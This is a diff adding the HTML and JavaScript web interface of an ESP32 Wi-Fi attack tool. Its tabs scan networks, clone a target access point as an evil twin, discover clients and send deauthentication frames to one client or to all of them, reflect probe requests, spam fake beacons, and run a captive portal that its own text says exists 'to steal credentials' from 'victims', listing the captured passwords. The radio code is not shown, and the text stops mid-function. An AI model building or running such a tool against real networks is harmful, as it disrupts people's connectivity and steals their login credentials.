@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ESP32 OST</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #f8fafc;
+  --surface: #ffffff;
+  --surface2: #f1f5f9;
+  --border: #e2e8f0;
+  --primary: #2563eb;
+  --primary-dark: #1d4ed8;
+  --danger: #ef4444;
+  --danger-dark: #dc2626;
+  --success: #10b981;
+  --success-dark: #059669;
+  --warning: #f59e0b;
+  --text: #0f172a;
+  --text-muted: #64748b;
+  --radius: 12px;
+  --shadow: 0 4px 20px rgba(0,0,0,0.06);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;padding:20px;line-height:1.5}
+.container{max-width:1060px;margin:0 auto}
+header{display:flex;flex-direction:column;align-items:center;padding:10px 0 30px}
+h1{font-size:2.5rem;color:var(--text);display:inline-flex;align-items:center;gap:12px;margin-bottom:0;font-weight:800}
+h1 i{color:var(--primary)}
+
+/* Navigation and Global Status */
+.nav-container { display: flex; flex-direction: row; justify-content: space-between; align-items: center; background: var(--surface); padding: 10px; border-radius: var(--radius); border: 1px solid var(--border); margin-bottom: 24px; flex-wrap: wrap; gap: 12px; box-shadow: var(--shadow); }
+.nav-tabs { display: flex; gap: 8px; overflow-x: auto; flex: 1; }
+.tab-btn{padding:10px 18px;border:none;background:transparent;color:var(--text-muted);font-weight:600;font-size:.9rem;cursor:pointer;border-radius:8px;transition:all 0.3s ease;white-space:nowrap;display:flex;align-items:center;gap:8px}
+.tab-btn:hover{background:var(--surface2);color:var(--text)}
+.tab-btn.active{background:var(--primary);color:#fff;box-shadow: 0 4px 12px rgba(37,99,235,0.25)}
+
+.global-status { padding-right: 8px; display: flex; align-items: center; }
+
+/* Panels */
+.panel{display:none;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:24px;animation:fadeIn .3s cubic-bezier(0.4, 0, 0.2, 1);box-shadow: var(--shadow)}
+.panel.active{display:block}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.toolbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid var(--border)}
+.toolbar h2{font-size:1.3rem;display:flex;align-items:center;gap:10px;color:var(--text);font-weight:700}
+
+/* Buttons */
+.btn{background:var(--primary);color:#fff;border:none;padding:10px 20px;border-radius:8px;font-weight:600;cursor:pointer;transition:all 0.2s;display:inline-flex;align-items:center;gap:8px;font-size:.9rem}
+.btn:hover{transform:translateY(-1px);filter:brightness(1.05);box-shadow: 0 4px 12px rgba(37,99,235,0.25)}
+.btn:active{transform:translateY(0)}
+.btn-danger{background:var(--danger);color:#fff;box-shadow: 0 4px 12px rgba(239,68,68,0.25)}
+.btn-danger:hover{background:var(--danger-dark);box-shadow: 0 4px 12px rgba(239,68,68,0.35)}
+.btn-success{background:var(--success);color:#fff;box-shadow: 0 4px 12px rgba(16,185,129,0.25)}
+.btn-success:hover{background:var(--success-dark);box-shadow: 0 4px 12px rgba(16,185,129,0.35)}
+.btn-outline{background:var(--surface);color:var(--text);border:1px solid var(--border)}
+.btn-outline:hover{background:var(--surface2);border-color:var(--text-muted);box-shadow:none}
+.btn-outline-danger{background:var(--surface);color:var(--danger);border:1px solid rgba(239,68,68,0.4)}
+.btn-outline-danger:hover{background:rgba(239,68,68,0.05);border-color:var(--danger)}
+.btn-sm{padding:6px 12px;font-size:.85rem}
+
+/* Tables */
+table{width:100%;border-collapse:collapse;margin-top:10px}
+th,td{padding:14px 16px;text-align:left;border-bottom:1px solid var(--border)}
+th{background:var(--surface2);color:var(--text-muted);font-weight:600;font-size:.85rem;text-transform:uppercase;letter-spacing:.05em}
+tr:hover td{background:var(--surface2)}
+tr:last-child td{border-bottom:none}
+
+/* Pills and Badges */
+.pill { display: inline-flex; align-items: center; gap: 6px; padding: 6px 14px; border-radius: 9999px; font-size: 0.8rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; transition: all 0.3s;}
+.pill-blue { background: rgba(37, 99, 235, 0.1); color: var(--primary-dark); border: 1px solid rgba(37, 99, 235, 0.3); }
+.pill-red { background: rgba(239, 68, 68, 0.1); color: var(--danger-dark); border: 1px solid rgba(239, 68, 68, 0.3); }
+.pill-green { background: rgba(16, 185, 129, 0.1); color: var(--success-dark); border: 1px solid rgba(16, 185, 129, 0.3); }
+.pill-outline { background: var(--surface); color: var(--text-muted); border: 1px solid var(--border); }
+
+.badge{padding:4px 10px;border-radius:9999px;font-size:.75rem;font-weight:700;display:inline-block}
+.badge-high{background:rgba(239,68,68,0.1);color:var(--danger-dark);border:1px solid rgba(239,68,68,0.2)}
+.badge-medium{background:rgba(245,158,11,0.1);color:#b45309;border:1px solid rgba(245,158,11,0.2)}
+.badge-low{background:rgba(16,185,129,0.1);color:var(--success-dark);border:1px solid rgba(16,185,129,0.2)}
+
+/* Boxes */
+.status-box{display:inline-flex;align-items:center;gap:10px;background:var(--surface2);border-radius:9999px;padding:8px 18px;margin-bottom:24px;font-size:.9rem;color:var(--text-muted);font-weight:500;}
+.info-box{background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:20px;margin-bottom:20px}
+.info-box p{color:var(--text-muted);font-size:.95rem;margin-bottom:16px}
+label.lbl{display:block;margin-bottom:6px;font-weight:600;font-size:.85rem;color:var(--text-muted)}
+input[type=text],input[type=number]{width:100%;padding:10px 14px;background:var(--surface);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.95rem;outline:none;transition:all .2s;font-family:monospace}
+input[type=text]:focus,input[type=number]:focus{border-color:var(--primary);box-shadow: 0 0 0 3px rgba(37,99,235,0.15)}
+input[readonly]{opacity:.7;cursor:default;background:var(--surface2)}
+
+.row{display:flex;gap:12px;flex-wrap:wrap}
+.row .btn{flex-shrink:0}
+
+/* Switch */
+.switch-row{display:flex;align-items:center;justify-content:space-between;background:var(--surface2);border:1px solid var(--border);border-radius:10px;padding:18px 24px;margin-bottom:16px}
+.switch-info h3{font-size:1.05rem;margin-bottom:4px;color:var(--text);font-weight:600}
+.switch-info p{font-size:.85rem;color:var(--text-muted)}
+.switch-right{display:flex;align-items:center;gap:12px}
+.sw-label{font-weight:700;font-size:.9rem;color:var(--text-muted);min-width:35px;text-align:right}
+.switch{position:relative;display:inline-block;width:52px;height:28px}
+.switch input{opacity:0;width:0;height:0}
+.slider{position:absolute;cursor:pointer;inset:0;background:var(--border);transition:.3s;border-radius:34px}
+.slider:before{position:absolute;content:"";height:20px;width:20px;left:4px;bottom:4px;background:#fff;transition:.3s;border-radius:50%;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+input:checked+.slider{background:var(--primary)}
+input:checked+.slider:before{transform:translateX(24px)}
+
+/* Lists */
+.client-list, .ssid-list{background:var(--surface);border:1px solid var(--border);border-radius:10px;min-height:80px;padding:10px}
+.client-item, .ssid-item{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;border-bottom:1px solid var(--border);gap:10px;border-radius:6px;transition:background .2s}
+.client-item:hover, .ssid-item:hover{background:var(--surface2)}
+.client-item:last-child, .ssid-item:last-child{border-bottom:none}
+.client-mac{font-family:monospace;font-size:1rem;display:flex;align-items:center;gap:10px;font-weight:500}
+.empty-msg{text-align:center;color:var(--text-muted);padding:30px;font-size:.95rem}
+
+/* Popup */
+#popup{position:fixed;top:30px;right:30px;left:auto;transform:translateX(120%);background:var(--surface);border:none;border-radius:12px;padding:16px 20px;box-shadow:0 10px 40px rgba(0,0,0,.12);display:flex;align-items:center;gap:16px;z-index:9999;opacity:0;pointer-events:none;transition:all .4s cubic-bezier(0.175, 0.885, 0.32, 1.275);min-width:300px}
+#popup.show{opacity:1;pointer-events:auto;transform:translateX(0)}
+#popup .popup-icon{font-size:1.6rem;color:var(--primary)}
+#popup .popup-title{font-weight:700;font-size:1rem;margin-bottom:4px;color:var(--text)}
+#popup .popup-msg{color:var(--text-muted);font-size:.85rem}
+#popup .popup-close{margin-left:auto;background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:1.1rem;padding:4px}
+#popup .popup-close:hover{color:var(--text)}
+
+/* Animations */
+.pulse{animation:pulse 1.5s infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(239,68,68,0.3)}70%{box-shadow:0 0 0 10px rgba(239,68,68,0)}100%{box-shadow:0 0 0 0 rgba(239,68,68,0)}}
+.elapsed{font-size:.8rem;color:var(--text-muted);margin-left:8px;font-variant-numeric: tabular-nums;}
+</style>
+</head>
+<body>
+<div class="container">
+
+<header>
+  <h1><i class="fas fa-wifi"></i> ESP32 OST</h1>
+</header>
+
+<div class="nav-container">
+  <div class="nav-tabs">
+    <button class="tab-btn active" id="tab-scanner"  onclick="switchTab('scanner',this)"><i class="fas fa-search"></i> Scanner</button>
+    <button class="tab-btn"        id="tab-spoofer"  onclick="switchTab('spoofer',this)"><i class="fas fa-clone"></i> Spoofer</button>
+    <button class="tab-btn"        id="tab-prober"   onclick="switchTab('prober',this)"><i class="fas fa-satellite-dish"></i> Prober</button>
+    <button class="tab-btn"        id="tab-ghost"    onclick="switchTab('ghost',this)"><i class="fas fa-ghost"></i> Ghost Mode</button>
+    <button class="tab-btn"        id="tab-spammer"  onclick="switchTab('spammer',this)"><i class="fas fa-broadcast-tower"></i> Spammer</button>
+    <button class="tab-btn"        id="tab-phishing" onclick="switchTab('phishing',this)"><i class="fas fa-fish"></i> Captive Portal</button>
+  </div>
+  <div class="global-status">
+    <span class="pill pill-outline" id="globalStatusIndicator"><i class="fas fa-circle-notch"></i> System Idle</span>
+  </div>
+</div>
+
+<!-- ========= SCANNER ========= -->
+<div id="scanner" class="panel active">
+  <div class="toolbar">
+    <h2><i class="fas fa-list-ul"></i> Visible Networks</h2>
+    <div class="row">
+      <button class="btn" onclick="refreshScan()"><i class="fas fa-sync-alt"></i> Refresh Scan</button>
+      <button class="btn btn-outline btn-sm" onclick="clearScanner()"><i class="fas fa-trash"></i> Clear</button>
+    </div>
+  </div>
+  <div class="status-box" id="scanStatus">
+    <span><i class="fas fa-info-circle"></i> Status: <span id="scanStatusText">Idle</span></span> 
+    <span class="elapsed" id="scanElapsed"></span>
+  </div>
+  <div style="overflow-x:auto">
+    <table>
+      <thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>RSSI</th><th>Security</th><th>Action</th></tr></thead>
+      <tbody id="netBody"><tr><td colspan="6" class="empty-msg">Click Refresh to scan for targets</td></tr></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- ========= SPOOFER ========= -->
+<div id="spoofer" class="panel">
+  <div class="toolbar"><h2><i class="fas fa-clone"></i> Super Clone (Evil Twin)</h2></div>
+  <div class="status-box" id="spoofStatus"><i class="fas fa-info-circle"></i> Status: Idle</div>
+  <div class="info-box">
+    <p><i class="fas fa-info-circle" style="color:var(--primary)"></i> Clones a target AP's SSID, BSSID and channel perfectly, overpowering it and causing client disconnections.</p>
+    <label class="lbl">Selected Target</label>
+    <input type="text" id="spoofTarget" readonly placeholder="Select a network from Scanner tab">
+    <div class="row" style="margin-top:14px">
+      <button class="btn btn-success" onclick="startSpoof()"><i class="fas fa-play"></i> Start Clone AP</button>
+      <button class="btn btn-danger"  onclick="stopSpoof()"><i class="fas fa-stop"></i> Stop AP</button>
+    </div>
+  </div>
+</div>
+
+<!-- ========= PROBER ========= -->
+<div id="prober" class="panel">
+  <div class="toolbar">
+    <h2><i class="fas fa-satellite-dish"></i> Client Prober</h2>
+    <button class="btn btn-outline btn-sm" onclick="clearProber()"><i class="fas fa-trash"></i> Clear List</button>
+  </div>
+  <div class="status-box" id="probeStatus"><i class="fas fa-info-circle"></i> Status: <span id="probeStatusText">Idle</span></div>
+  <div class="info-box">
+    <p><i class="fas fa-info-circle" style="color:var(--primary)"></i> Sniffs packets to discover MAC addresses of clients connected to the target AP.</p>
+    <div style="background:rgba(245,158,11,0.1);border:1px solid rgba(245,158,11,0.3);border-radius:8px;padding:12px 16px;margin-bottom:16px;font-size:.9rem;color:#fbbf24">
+      <i class="fas fa-exclamation-triangle"></i> <strong>Deauth Workflow:</strong> First probe to discover clients, then click <strong>Stop Capture</strong>, then click <strong>Deauth</strong> on any client. The firmware automatically stops probing before launching the attack.
+    </div>
+    <label class="lbl">Selected Target</label>
+    <input type="text" id="probeTargetInfo" readonly placeholder="Select a network from Scanner tab">
+    <div class="row" style="margin-top:14px">
+      <button class="btn btn-success" onclick="startProbe()"><i class="fas fa-play"></i> Start Capture</button>
+      <button class="btn btn-outline"  onclick="stopProbe()"><i class="fas fa-stop"></i> Stop Capture</button>
+      <span id="deauthAllBtnContainer">
+        <button class="btn btn-outline-danger" onclick="startDeauth('FF:FF:FF:FF:FF:FF')"><i class="fas fa-bolt"></i> Deauth All Devices</button>
+      </span>
+    </div>
+  </div>
+  <h3 style="margin-bottom:12px;font-size:1.05rem;color:var(--text);font-weight:600">Detected Clients</h3>
+  <div class="client-list" id="probeClients"><p class="empty-msg">No clients detected yet.</p></div>
+</div>
+
+<!-- ========= GHOST MODE ========= -->
+<div id="ghost" class="panel">
+  <div class="toolbar">
+    <h2><i class="fas fa-ghost"></i> Ghost Mode</h2>
+    <div class="row">
+      <button class="btn" onclick="refreshGhost()"><i class="fas fa-sync-alt"></i> Refresh SSIDs</button>
+      <button class="btn btn-outline-danger btn-sm" onclick="clearGhost()"><i class="fas fa-trash"></i> Clear</button>
+    </div>
+  </div>
+  <div class="switch-row">
+    <div class="switch-info">
+      <h3>Probe Reflection (Ghost Mode)</h3>
+      <p>Sniffs client probe requests and re-broadcasts fake APs matching each requested SSID.</p>
+    </div>
+    <div class="switch-right">
+      <span class="sw-label" id="ghostStatusLabel">OFF</span>
+      <label class="switch">
+        <input type="checkbox" id="ghostModeToggle" onchange="toggleGhost(this.checked)">
+        <span class="slider"></span>
+      </label>
+    </div>
+  </div>
+  <div class="status-box" id="ghostStatus"><i class="fas fa-info-circle"></i> Status: Idle</div>
+  <h3 style="margin-bottom:12px;font-size:1.05rem;color:var(--text);font-weight:600">Detected SSIDs from Probe Requests</h3>
+  <div class="ssid-list" id="ghostSSIDList"><p class="empty-msg">No probe SSIDs captured yet. Enable Ghost Mode and wait.</p></div>
+</div>
+
+<!-- ========= SPAMMER ========= -->
+<div id="spammer" class="panel">
+  <div class="toolbar"><h2><i class="fas fa-broadcast-tower"></i> Beacon Spammer</h2></div>
+
+  <div class="info-box" style="margin-bottom:20px">
+    <p><i class="fas fa-sliders-h" style="color:var(--primary)"></i> Configure the spam parameters below, then toggle the spammer on.</p>
+    <div class="row" style="margin-bottom:16px">
+      <div style="flex:1;min-width:160px">
+        <label class="lbl">AP Name Prefix</label>
+        <input type="text" id="spamPrefix" value="Pwned_" placeholder="Pwned_">
+      </div>
+      <div style="flex:1;min-width:120px">
+        <label class="lbl">Number of APs</label>
+        <input type="number" id="spamCount" value="30" min="1" max="255">
+      </div>
+    </div>
+    <p style="font-size:.85rem;color:var(--text-muted);margin:0"><i class="fas fa-info-circle"></i> Each fake AP will be named <em>&lt;Prefix&gt;0</em>, <em>&lt;Prefix&gt;1</em>, …</p>
+  </div>
+
+  <div class="switch-row">
+    <div class="switch-info">
+      <h3>Random Beacon Spam</h3>
+      <p>Floods the airspace with dozens of fake AP beacons to confuse nearby devices.</p>
+    </div>
+    <div class="switch-right">
+      <span class="sw-label" id="beaconStatusLabel">OFF</span>
+      <label class="switch">
+        <input type="checkbox" id="beaconSpamToggle" onchange="toggleSpam(this.checked)">
+        <span class="slider"></span>
+      </label>
+    </div>
+  </div>
+  <div class="status-box" id="spamStatus"><i class="fas fa-info-circle"></i> Status: Idle</div>
+</div>
+
+<!-- ========= CAPTIVE PORTAL ========= -->
+<div id="phishing" class="panel">
+  <div class="toolbar">
+    <h2><i class="fas fa-fish"></i> Captive Portal (Evil Twin)</h2>
+    <div class="row">
+      <button class="btn btn-outline-danger btn-sm" onclick="clearPhishing()"><i class="fas fa-trash"></i> Clear Credentials</button>
+    </div>
+  </div>
+  <div class="info-box">
+    <p><i class="fas fa-info-circle" style="color:var(--primary)"></i> Spawns a fake AP and redirects all connected victims to a fake Wi-Fi authentication page to steal credentials.</p>
+    <label class="lbl">Fake AP Name (SSID)</label>
+    <input type="text" id="phishingSSID" placeholder="e.g. Free Public Wi-Fi" value="Free Public Wi-Fi">
+    <div class="row" style="margin-top:14px">
+      <button class="btn btn-success" onclick="startPhishing()"><i class="fas fa-play"></i> Start Attack</button>
+      <button class="btn btn-danger"  onclick="stopPhishing()"><i class="fas fa-stop"></i> Stop Attack</button>
+    </div>
+  </div>
+  <div class="status-box" id="phishingStatus"><i class="fas fa-info-circle"></i> Status: <span id="phishingStatusText">Idle</span></div>
+  <h3 style="margin-bottom:12px;font-size:1.05rem;color:var(--text);font-weight:600">Captured Credentials</h3>
+  <div style="overflow-x:auto">
+    <table>
+      <thead><tr><th>Username / Email</th><th>Password</th><th>Captured At</th></tr></thead>
+      <tbody id="phishingBody"><tr><td colspan="3" class="empty-msg">No credentials captured yet.</td></tr></tbody>
+    </table>
+  </div>
+</div>
+
+</div><!-- /container -->
+
+<!-- ========= POPUP NOTIFICATION ========= -->
+<div id="popup">
+  <div class="popup-icon"><i class="fas fa-crosshairs"></i></div>
+  <div class="popup-body">
+    <div class="popup-title" id="popup-title">Target Selected</div>
+    <div class="popup-msg"  id="popup-msg"></div>
+  </div>
+  <button class="popup-close" onclick="closePopup()"><i class="fas fa-times"></i></button>
+</div>
+
+<script>
+let currentTarget = null;
+let pollInterval  = null;
+let ghostInterval = null;
+let phishingInterval = null;
+let popupTimer    = null;
+
+let currentDeauthMac = null;
+let lastProbeData = [];
+
+// ---------------------------------------------------------------------------
+// Global Status Indicator
+// ---------------------------------------------------------------------------
+function setGlobalStatus(text, pillClass, iconClass) {
+  const ind = document.getElementById('globalStatusIndicator');
+  ind.className = `pill ${pillClass}`;
+  ind.innerHTML = `<i class="fas fa-${iconClass}"></i> ${text}`;
+}
+
+// ---------------------------------------------------------------------------
+// Tab switching
+// ---------------------------------------------------------------------------
+function switchTab(id, btn) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  btn.classList.add('active');
+}
+
+// ---------------------------------------------------------------------------
+// Popup notification
+// ---------------------------------------------------------------------------
+function showPopup(title, msg, icon) {
+  const p = document.getElementById('popup');
+  document.getElementById('popup-title').textContent = title;
+  document.getElementById('popup-msg').textContent   = msg;
+  if (icon) p.querySelector('.popup-icon i').className = 'fas fa-' + icon;
+  p.classList.add('show');
+  clearTimeout(popupTimer);
+  popupTimer = setTimeout(closePopup, 4000);
+}
+function closePopup() {
+  document.getElementById('popup').classList.remove('show');
+}
+
+// ---------------------------------------------------------------------------
+// Set target from scanner row
+// ---------------------------------------------------------------------------
+function setTarget(ssid, bssid, channel) {
+  currentTarget = { ssid, bssid, channel };
+  const info = `${ssid || '<Hidden>'} | ${bssid} | Ch ${channel}`;
+  document.getElementById('spoofTarget').value     = info;
+  document.getElementById('probeTargetInfo').value = info;
+  showPopup('Target Selected', `${ssid || '<Hidden>'}  •  ${bssid}  •  Ch ${channel}`, 'crosshairs');
+}
+
+// ---------------------------------------------------------------------------
+// Scanner
+// ---------------------------------------------------------------------------
+let lastScanTime = null;
+let elapsedTimer = null;
+function updateElapsed() {
+  if (!lastScanTime) return;
+  const secs = Math.floor((Date.now() - lastScanTime) / 1000);
+  const txt = secs < 60 ? `${secs}s ago` : `${Math.floor(secs/60)}m ${secs%60}s ago`;
+  document.getElementById('scanElapsed').textContent = `— ${txt}`;
+}
+async function refreshScan() {
+  const tbody = document.getElementById('netBody');
+  tbody.innerHTML = '<tr><td colspan="6" class="empty-msg"><i class="fas fa-spinner fa-spin"></i> Scanning networks...</td></tr>';
+  document.getElementById('scanStatusText').innerHTML = '<span style="color:var(--warning)">Scanning in progress...</span>';
+  document.getElementById('scanElapsed').textContent = '';
+  setGlobalStatus('Scanning Networks', 'pill-blue', 'spinner fa-spin');
+  
+  try {
+    const res  = await fetch('/scan');
+    const data = await res.json();
+    lastScanTime = Date.now();
+    clearInterval(elapsedTimer);
+    elapsedTimer = setInterval(updateElapsed, 1000);
+    tbody.innerHTML = '';
+    if (!data.length) {
+      tbody.innerHTML = '<tr><td colspan="6" class="empty-msg">No networks found</td></tr>';
+      document.getElementById('scanStatusText').innerHTML = '<span style="color:var(--text-muted)">Scan Done- 0 networks</span>';
+      setGlobalStatus('Scan Done', 'pill-outline', 'check');
+      return;
+    }
+    document.getElementById('scanStatusText').innerHTML = `<span style="color:var(--success)">Scan Done- ${data.length} networks found</span>`;
+    setGlobalStatus('Scan Done', 'pill-green', 'check');
+    updateElapsed();
+    
+    data.forEach(n => {
+      const bc = n.risk === 'HIGH' ? 'badge-high' : (n.risk === 'MEDIUM' ? 'badge-medium' : 'badge-low');
+      const ssidSafe = (n.ssid || '').replace(/'/g, "\\'");
+      const bssidSafe = n.bssid.replace(/'/g, "\\'");
+      tbody.innerHTML += `<tr>
+        <td style="font-weight:600">${n.ssid || '<em style="color:var(--text-muted)">&lt;Hidden&gt;</em>'}</td>
+        <td style="font-family:monospace;font-size:.9rem">${n.bssid}</td>
+        <td>${n.channel}</td>
+        <td>${n.rssi} dBm</td>
+        <td><span class="badge ${bc}">${n.encryption}</span></td>
+        <td><button class="btn btn-sm btn-outline" onclick="setTarget('${ssidSafe}','${bssidSafe}',${n.channel})"><i class="fas fa-bullseye" style="color:var(--primary)"></i> Select</button></td>
+      </tr>`;
+    });
+  } catch(e) {
+    tbody.innerHTML = '<tr><td colspan="6" class="empty-msg" style="color:var(--danger)">Scan failed – check connection</td></tr>';
+    document.getElementById('scanStatusText').innerHTML = '<span style="color:var(--danger)">Scan Failed</span>';
+    setGlobalStatus('Scan Failed', 'pill-red', 'exclamation-circle');
+  }
+}
+function clearScanner() {
+  document.getElementById('netBody').innerHTML = '<tr><td colspan="6" class="empty-msg">Click Refresh to scan for targets</td></tr>';
+  document.getElementById('scanStatusText').textContent = 'Idle';
+  document.getElementById('scanElapsed').textContent = '';
+  clearInterval(elapsedTimer);
+  lastScanTime = null;
+  setGlobalStatus('System Idle', 'pill-outline', 'circle-notch');
+}
+
+// ---------------------------------------------------------------------------
+// Spoofer
+// ---------------------------------------------------------------------------
+async function startSpoof() {
+  if (!currentTarget) { showPopup('No Target', 'Select a network from the Scanner tab first.', 'exclamation-triangle'); return; }
+  const res = await fetch(`/spoof_start?ssid=${encodeURIComponent(currentTarget.ssid)}&bssid=${currentTarget.bssid}&channel=${currentTarget.channel}`);
+  if (res.ok) {
+    document.getElementById('spoofStatus').innerHTML = `<i class="fas fa-info-circle"></i> Status: <span style="color:var(--success)">Clone Active- '${currentTarget.ssid}'</span>`;
+    showPopup('Clone Active', `Broadcasting as '${currentTarget.ssid}'`, 'clone');
+    setGlobalStatus('Spoofing AP', 'pill-blue pulse', 'clone');
+  }
+}
+async function stopSpoof() {
+  await fetch('/spoof_stop');
+  document.getElementById('spoofStatus').innerHTML = '<i class="fas fa-info-circle"></i> Status: <span style="color:var(--text-muted)">Idle</span>';
+  setGlobalStatus('System Idle', 'pill-outline', 'circle-notch');
+}
+
+// ---------------------------------------------------------------------------
+// Prober
+// ---------------------------------------------------------------------------
+async function startProbe() {
+  if (!currentTarget) { showPopup('No Target', 'Select a network from the Scanner tab first.', 'exclamation-triangle'); return; }
+  setProbeStatus('Probing…', 'var(--warning)');
+  setGlobalStatus('Probing Clients', 'pill-blue', 'satellite-dish');
+  const res = await fetch(`/probe_start?bssid=${currentTarget.bssid}&channel=${currentTarget.channel}`);
+  if (res.ok) {
+    setProbeStatus(`Probing- ${currentTarget.bssid}`, 'var(--success)');
+    clearInterval(pollInterval);
+    pollInterval = setInterval(pollProbe, 2000);
+  }
+}
+async function stopProbe() {
+  await fetch('/probe_stop');
+  clearInterval(pollInterval);
+  setProbeStatus('Probing Stopped', 'var(--text-muted)');
+  setGlobalStatus('System Idle', 'pill-outline', 'circle-notch');
+}
+async function clearProber() {
+  await fetch('/probe_clear');
+  lastProbeData = [];
+  renderProbeClients([]);
+  setProbeStatus('Idle', 'var(--text-muted)');
+  showPopup('Cleared', 'Client list cleared.', 'trash');
+}
+function setProbeStatus(msg, color) {
+  document.getElementById('probeStatusText').innerHTML = `<span style="color:${color}">${msg}</span>`;
+}
+async function pollProbe() {
+  const res  = await fetch('/probe_results');
+  const data = await res.json();
+  lastProbeData = data;
+  renderProbeClients(data);
+}
+function renderProbeClients(data) {
+  const box = document.getElementById('probeClients');
+  if (!data || !data.length) {
+    box.innerHTML = '<p class="empty-msg">No clients detected yet.</p>';
+    return;
+  }
+  box.innerHTML = '';
+  data.forEach(mac => {
+    const macSafe = mac.replace(/'/g, "\\'");
+    const isDeauthing = (mac === currentDeauthMac);
+    
+    let actionButtons = '';
+    if (isDeauthing) {
+      actionButtons = `
+        <button class="btn btn-danger pulse btn-sm" onclick="stopDeauth()"><i class="fas fa-bolt"></i> Attacking</button>
+      `;
+    } else {
+      actionButtons = `
+        <button class="btn btn-outline-danger btn-sm" onclick="startDeauth('${macSafe}')"><i class="fas fa-bolt"></i> Deauth</button>
+      `;
+    }
+
+    box.innerHTML += `<div class="client-item">
+      <span class="client-mac"><i class="fas fa-mobile-alt" style="color:var(--primary)"></i> ${mac}</span>
+      <div style="display:flex;gap:8px">
+        ${actionButtons}
+      </div>
+    </div>`;
+  });
+}
+
+// ---------------------------------------------------------------------------
+// Deauth
+// ---------------------------------------------------------------------------
+function updateDeauthAllBtn() {
+  const container = document.getElementById('deauthAllBtnContainer');
+  if (!container) return;
+  if (currentDeauthMac === 'FF:FF:FF:FF:FF:FF') {
+    container.innerHTML = `<button class="btn btn-danger pulse" onclick="stopDeauth()"><i class="fas fa-bolt"></i> Attacking All</button>`;
+  } else {
+    container.innerHTML = `<button class="btn btn-outline-danger" onclick="startDeauth('FF:FF:FF:FF:FF:FF')"><i class="fas fa-bolt"></i> Deauth All Devices</button>`;
+  }
+}
+
+async function startDeauth(mac) {
+  if (!currentTarget) { showPopup('No Target', 'Select a target AP first.', 'exclamation-triangle'); return; }
+  clearInterval(pollInterval); // Firmware auto-stops promiscuous mode
+  
+  currentDeauthMac = mac;
+  renderProbeClients(lastProbeData); // Update button to red immediately
+  updateDeauthAllBtn(); // Update broadcast button state
+  
+  const isBroadcast = (mac === 'FF:FF:FF:FF:FF:FF');
+  setProbeStatus(isBroadcast ? `Deauthing ALL clients…` : `Deauthing ${mac}…`, 'var(--danger)');
+  setGlobalStatus('Deauth Active', 'pill-red pulse', 'bolt');
+  
+  const url = `/deauth_start?bssid=${currentTarget.bssid}&channel=${currentTarget.channel}&client=${encodeURIComponent(mac)}&ssid=${encodeURIComponent(currentTarget.ssid || '')}`;
+  const res = await fetch(url);
+  if (res.ok) showPopup('Deauth Active', isBroadcast ? `Sending Broadcast 0xC0 frames  (Ch${currentTarget.channel})` : `Sending 0xC0 frames → ${mac}  (Ch${currentTarget.channel})`, 'bolt');
+}
+async function stopDeauth() {
+  await fetch('/deauth_stop');
+  currentDeauthMac = null;
+  renderProbeClients(lastProbeData); // Reset button styles
+  updateDeauthAllBtn(); // Reset broadcast button state
+  
+  setProbeStatus('Deauth Stopped', 'var(--text-muted)');
+  setGlobalStatus('System Idle', 'pill-outline', 'circle-notch');
+  showPopup('Deauth Stopped', 'Attack halted.', 'check-circle');
+}
+
+// ---------------------------------------------------------------------------
+// Ghost Mode
+// ---------------------------------------------------------------------------
+async function toggleGhost(state) {
+  const lbl = document.getElementById('ghostStatusLabel');
+  lbl.textContent = state ? 'ON' : 'OFF';
+  lbl.style.color = state ? 'var(--success)' : 'var(--text-muted)';
+  await fetch(`/spam?type=ghost&state=${state ? 'on' : 'off'}`);
+  document.getElementById('ghostStatus').innerHTML = state
+    ? '<i class="fas fa-info-circle"></i> Status: <span style="color:var(--success)">Active- listening for probe requests</span>'
+    : '<i class="fas fa-info-circle"></i> Status: <span style="color:var(--text-muted)">Idle</span>';
+  
+  if (state) {
+    clearInterval(ghostInterval);
+    ghostInterval = setInterval(refreshGhost, 3000);
+    showPopup('Ghost Mode ON', 'Listening for probe requests…', 'ghost');
+    setGlobalStatus('Probing Ghosts', 'pill-blue', 'ghost');
+  } else {
+    clearInterval(ghostInterval);
+    setGlobalStatus('System Idle', 'pill-outline', 'circle-notch');
+  }
+}
+async function refreshGhost() {
+  const res  = await fetch('/ghost_results');
+  const data = await res.json();
+  const box  = document.getElementById('ghostSSIDList');
+  if (!data.length) return;
+  box.innerHTML = '';
+  data.forEach((ssid, i) => {
+    box.innerHTML += `<div class="ssid-item"><div style="display:flex;align-items:center;gap:10px"><i class="fas fa-wifi" style="color:var(--primary)"></i> <span style="font-weight:600">${ssid}</span></div> <span style="font-size:.8rem;color:var(--text-muted)">#${i+1}</span></div>`;
+  });
+}
+async function clearGhost() {
+  await fetch('/ghost_clear');
+  document.getElementById('ghostSSIDList').innerHTML = '<p class="empty-msg">No probe SSIDs captured yet.</p>';
+  showPopup('Cleared', 'Ghost SSID list cleared.', 'trash');
+}
+
+// ---------------------------------------------------------------------------
+// Beacon Spammer
+// ---------------------------------------------------------------------------
+async function toggleSpam(state) {
+  const lbl    = document.getElementById('beaconStatusLabel');
+  const prefix = encodeURIComponent(document.getElementById('spamPrefix').value || 'Pwned_');
+  const count  = document.getElementById('spamCount').value || 30;
